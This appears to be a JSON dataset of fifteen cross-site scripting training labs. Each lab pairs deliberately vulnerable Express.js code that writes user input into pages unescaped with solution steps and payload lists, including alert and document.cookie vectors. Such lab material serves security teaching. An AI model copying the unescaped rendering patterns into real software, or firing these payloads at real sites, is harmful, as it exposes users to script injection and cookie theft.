[
{
  "Lab scenario": "Stored XSS in Feedback Widget",
  "Lab Description": "The feedback widget stores user-submitted feedback and displays it for admin review. The text is injected into the DOM using innerHTML without escaping, allowing stored XSS.\nTo solve: Submit a feedback entry with script code.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Submit feedback with a script tag via /feedback.",
    "View feedback via /admin to observe XSS.",
    "Try encoded payloads or HTML event attributes.",
    "Confirm the XSS is persistent across sessions.",
    "Observe execution without admin interaction."
  ],
  "payloads": [
    "<script>alert('Feedback XSS')</script>",
    "<img src=1 onerror=alert('Stored')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/feedback', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Feedback Form</h2>\n        <form action='/submit' method='POST'>\n          <textarea name='msg' placeholder='Your feedback'></textarea>\n          <button>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  feedbacks.push(req.body.msg);\n  console.log('[SUBMIT] New feedback:', req.body.msg);\n  res.redirect('/admin');\n});\n\napp.get('/admin', (req, res) => {\n  const out = feedbacks.map(m => `<div>${m}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Admin Panel</h2>\n        ${out}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Feedback system ready'));\n"
},
{
  "Lab scenario": "Reflected XSS in Newsletter Signup Confirmation",
  "Lab Description": "After a newsletter signup, the server reflects the name parameter in a confirmation message. This allows reflected XSS via the URL.\nTo solve: Inject script in the name parameter.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Navigate to /signup?name=YourName.",
    "Replace the name with a payload: <script>alert('XSS')</script>.",
    "Check the confirmation message for script execution.",
    "Test different HTML elements to bypass filters.",
    "Confirm execution before any form interaction."
  ],
  "payloads": [
    "<script>alert('Newsletter')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/signup', (req, res) => {\n  const name = req.query.name || 'User';\n  console.log('[INFO] Signup from:', name);\n  res.send(`\n    <html>\n      <body>\n        <h2>Thank You</h2>\n        <p>Welcome, ${name}! You've been subscribed.</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Newsletter server running'));\n"
},
{
  "Lab scenario": "DOM-based XSS in Chat Preview",
  "Lab Description": "A chat preview interface uses localStorage to show the last message in the DOM via innerHTML. A crafted value can execute code when the preview is loaded.\nTo solve: Inject XSS via localStorage and refresh the preview page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Open browser console and run: localStorage.setItem('lastMsg', '<img src=x onerror=alert(1)>').",
    "Navigate to /chat to preview the message.",
    "Observe the script executing from localStorage.",
    "Try encoded or nested payloads.",
    "Clear localStorage to reset the preview."
  ],
  "payloads": [
    "<script>alert('DOM Chat')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Chat Preview</h2>\n        <div id='msg'></div>\n        <script>\n          const preview = localStorage.getItem('lastMsg');\n          if (preview) {\n            document.getElementById('msg').innerHTML = preview;\n            console.log('[DEBUG] Rendered preview:', preview);\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Chat preview on 3000'));\n"
},
{
  "Lab scenario": "Stored XSS in Blog Post Comments",
  "Lab Description": "A blog page lets users comment on posts. Comments are stored in memory and rendered directly on the blog without sanitization, allowing stored XSS.\nTo solve: Submit a comment containing a script and refresh the blog to see it execute.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Navigate to /blog and locate the comment form.",
    "Submit a comment with a script tag payload.",
    "Reload the page and observe persistent script execution.",
    "Try variations for different alert messages.",
    "Confirm the payload runs after page refresh."
  ],
  "payloads": [
    "<script>alert('Blog XSS')</script>",
    "<img src=1 onerror=alert('Stored')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/blog', (req, res) => {\n  const renderedComments = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Blog Post</h2>\n        <p>Interesting article about security!</p>\n        <h3>Comments</h3>\n        ${renderedComments}\n        <form action='/comment' method='POST'>\n          <input name='text' placeholder='Comment here'>\n          <button>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  console.log('[LOG] New comment:', req.body.text);\n  comments.push(req.body.text);\n  res.redirect('/blog');\n});\n\napp.listen(3000, () => console.log('Blog server running'));\n"
},
{
  "Lab scenario": "Reflected XSS in Support Ticket Viewer",
  "Lab Description": "The support dashboard displays ticket previews by taking `title` and `desc` as query parameters. These are inserted into the DOM without escaping, allowing reflected XSS via the `desc` field.\nTo solve: Inject a script in the desc parameter to trigger an alert on preview.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Visit /ticket?title=Help&desc=Issue+Details.",
    "Replace desc with a script payload like <script>alert('XSS')</script>.",
    "Load the page and observe reflected script execution.",
    "Try encoding the payload if filters exist.",
    "Confirm that every load with the payload triggers alert."
  ],
  "payloads": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('Reflected')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/ticket', (req, res) => {\n  const { title = 'No Title', desc = 'No Description' } = req.query;\n  console.log('[DEBUG] Ticket received:', { title, desc });\n  res.send(`\n    <html>\n      <body>\n        <h2>Support Ticket</h2>\n        <h3>${title}</h3>\n        <p>${desc}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Ticket Viewer running on 3000'));\n"
},
{
  "Lab scenario": "DOM-based XSS via Drag-and-Drop Upload Preview",
  "Lab Description": "The dashboard includes a drag-and-drop file upload zone with preview text. The application sets the preview using `innerHTML` from the dragged file name without sanitization.\nTo solve: Simulate a drag-drop event with a crafted filename triggering script execution.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Open DevTools and simulate a drag-and-drop event with a fake File object.",
    "Set file name to: <img src=x onerror=alert('XSS')>.",
    "Drop it in the upload zone and observe script execution.",
    "Try encoded variants and payloads with data URIs.",
    "Confirm reliable trigger without actual file upload."
  ],
  "payloads": [
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert(document.domain)"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.static('.'));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='drop-zone'>Drop file here</div>\n        <div id='preview'></div>\n        <script>\n          const dropZone = document.getElementById('drop-zone');\n          dropZone.addEventListener('drop', (e) => {\n            e.preventDefault();\n            const file = e.dataTransfer.files[0];\n            document.getElementById('preview').innerHTML = file.name;\n          });\n          dropZone.addEventListener('dragover', e => e.preventDefault());\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in ChatBot Interaction History",
  "Lab Description": "A web-based chatbot logs previous interactions and loads them from local storage using `innerHTML`. Messages are not encoded before rendering, allowing injection.\nTo solve: Inject a payload into localStorage and reload to trigger XSS.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Open console and set localStorage.setItem('chatLog', '<img src=x onerror=alert(1)>').",
    "Refresh the page and check the chat area.",
    "Confirm the script executes.",
    "Try payloads with event handlers or <details>/<summary> tags.",
    "Test visibility and stealth of payloads in different themes."
  ],
  "payloads": [
    "<img src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert(1)>X</details>",
    "<svg onload=alert(document.cookie)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='chat'></div>\n        <script>\n          const log = localStorage.getItem('chatLog');\n          if (log) document.getElementById('chat').innerHTML = log;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Reflected XSS via Username in WebSocket Debug Echo",
  "Lab Description": "A debug tool sends WebSocket messages with a username in the query string. The page reflects the username using `document.write`, exposing it to XSS.\nTo solve: Craft a URL with a payload in the `user` parameter that executes in real-time.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Access /ws-debug?user=<svg/onload=alert(1)>.",
    "Observe payload reflected and executed.",
    "Test vectors with WebSocket events and reconnect attempts.",
    "Use minimal tags to bypass CSP or validation.",
    "Confirm script executes before WebSocket connection opens."
  ],
  "payloads": [
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('WS XSS')>",
    "<script>alert('Injected')</script>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/ws-debug', (req, res) => {\n  const user = req.query.user || 'guest';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          document.write('<div>Welcome ${user}</div>');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in Theme Name for Admin Preview",
  "Lab Description": "Admin panel allows creating custom UI themes. The theme name is stored and reflected without escaping in a preview panel using `innerHTML`.\nTo solve: Inject a payload as a theme name, save it, and preview to trigger XSS.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Login as admin and create a theme with name: <img src=x onerror=alert('XSS')>.",
    "Save the theme and go to preview section.",
    "Confirm payload executes in theme header.",
    "Try encoded scripts or nested tag vectors.",
    "Validate persistence across user sessions."
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('Theme XSS')>",
    "<script>alert('Theme Injected')</script>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet themeName = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-theme', (req, res) => {\n  themeName = req.body.name;\n  res.redirect('/preview-theme');\n});\n\napp.get('/preview-theme', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h1>Preview: ${themeName}</h1>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "DOM-based XSS in URL Fragment-based Loader",
  "Lab Description": "A documentation site loads pages based on the URL fragment and injects it into the DOM using `innerHTML`. No validation is done on the hash, enabling XSS.\nTo solve: Craft a URL with a malicious hash and observe DOM execution.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Access /#<img src=x onerror=alert('XSS')>.",
    "Watch how the fragment is injected into the page.",
    "Confirm DOM-based XSS on reload.",
    "Use nested <template> or <marquee> for stealth.",
    "Test on different browsers for reliability."
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('Hash XSS')>",
    "<marquee onstart=alert('XSS')>hi</marquee>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='doc'></div>\n        <script>\n          const hash = location.hash.slice(1);\n          document.getElementById('doc').innerHTML = hash;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},

{
  "Lab scenario": "Reflected XSS via Search Suggestion Parameter",
  "Lab Description": "The search page accepts a `suggest` parameter that is reflected directly into a live suggestion box using `innerHTML`. There is no sanitization, and script injection is possible.\nTo solve: Inject a payload via the suggest parameter and trigger execution in the suggestion box.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Navigate to /search?suggest=<img src=x onerror=alert(1)>",
    "Observe the suggestion box rendering the payload",
    "Try inline scripts or attribute-based vectors",
    "Confirm execution on every keypress if the parameter updates dynamically"
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.domain)>",
    "<script>alert('Reflected')</script>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const suggest = req.query.suggest || '';\n  res.send(`\n    <html>\n      <body>\n        <div>Suggestions:</div>\n        <div id='suggestion-box'></div>\n        <script>\n          document.getElementById('suggestion-box').innerHTML = '${suggest}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in Comment System Avatar Field",
  "Lab Description": "Users can leave comments with a custom avatar URL. The server stores the avatar field and renders it in an <img> tag without validation.\nTo solve: Submit a comment with an avatar containing a malicious payload.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Submit a comment with avatar: x onerror=alert(1)",
    "Reload the page to trigger the <img> tag error handler",
    "Try payloads with event handlers or SVG URIs",
    "Confirm persistence across multiple sessions"
  ],
  "payloads": [
    "x onerror=alert(1)",
    "x\" onerror=\"alert('stored')",
    "data:image/svg+xml,<svg onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push({ user: req.body.user, avatar: req.body.avatar });\n  res.redirect('/comments');\n});\n\napp.get('/comments', (req, res) => {\n  const list = comments.map(c => `<div><img src='${c.avatar}'><b>${c.user}</b></div>`).join('');\n  res.send(`<html><body>${list}</body></html>`);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "DOM XSS via Dynamic FAQ Loader",
  "Lab Description": "The FAQ page loads answers based on the question ID from the URL and inserts content using `innerHTML`. It trusts hash fragments and does not sanitize them.\nTo solve: Inject a payload into the fragment and observe script execution.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Go to /faq#<img src=x onerror=alert(1)>",
    "Observe the dynamic content area rendering your payload",
    "Test with scripts, SVG, or <video poster> vectors",
    "Confirm execution across different browsers"
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/faq', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='faq-content'></div>\n        <script>\n          const hash = decodeURIComponent(location.hash.slice(1));\n          document.getElementById('faq-content').innerHTML = hash;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Reflected XSS in Email Invitation Link",
  "Lab Description": "A collaboration tool sends invitation links with a `ref` parameter that gets rendered on the join page using `document.write`. There’s no escaping.\nTo solve: Craft a malicious `ref` that executes JavaScript when opened.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Create a URL like /invite?ref=<script>alert('XSS')</script>",
    "Send to target or open directly",
    "Observe script execution before any validation happens",
    "Try encoding or malformed attribute injection"
  ],
  "payloads": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('ref')>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/invite', (req, res) => {\n  const ref = req.query.ref || '';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          document.write('Invited by: ' + '${ref}');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in Image Gallery Title Field",
  "Lab Description": "An image gallery allows uploading a picture with a title. The title is rendered with `innerHTML` and stored without sanitization, allowing persistent XSS.\nTo solve: Upload an image with a malicious title payload.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Upload an image with a title: <img src=x onerror=alert(1)>",
    "Visit the gallery and find the injected title",
    "Confirm that the script executes without interaction",
    "Try stealthy payloads using <math> or <object>"
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
    "<object data=x onerror=alert('XSS')>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet images = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  images.push({ title: req.body.title });\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = images.map(i => `<div>${i.title}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);\n"
}

]





